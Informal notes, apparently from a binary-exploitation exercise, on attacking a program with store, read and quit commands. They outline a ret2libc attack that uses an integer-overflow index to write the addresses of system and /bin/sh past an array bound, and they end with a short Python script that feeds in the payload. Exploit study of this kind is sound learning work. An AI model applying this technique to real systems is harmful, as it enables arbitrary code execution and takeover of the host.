possible exploit :
    
    * its possible to concatenate any shellcode to a legal command(store, read, quit)
    * inject the shellcode in command buff.
    * overwrite the return address of main or other function to execute shellcode.
    ===> overiwting the return address of main didn't work since the offeset is + 14 from the end of buff, 
    * overwrite the plt 

possible pyload :

    * [address of system] + [ adress of return of system]  + [adress of /bin/sh/]

since we can't write 3 continues value , the index of the return address of system could be in an index divisible by 3, it has no effect since the goal is to return to system .

--------------------------------------------------------------

the only thing last is to find a way to redirect the return to the address of our pyload


python -c 'print 

magic number 1073741938
system = 0xf7e6aed0 = 4159090384
/bin/sh = 0xf7f897ec = 4160264172

start of shellcode 4294956332 ===>  0xffffd52c


1*2^(30) = 1073741824


4294956328


import time
import struct

# 1073741938 == 114

store = "store"
quit = "quit"
index_system = "1073741938"
index_bin_sh = "116"
return_from_system = struct.pack("I", 0x41414141)
bin_sh = struct.pack("I", 0xf7f897ec)
system = struct.pack("I", 0xf7e6aed0)

print store
time.sleep(1)
print system
time.sleep(1)
print index_system
time.sleep(1)
print store
time.sleep(1)
print bin_sh
time.sleep(1)
print index_bin_sh
time.sleep(1)
print quit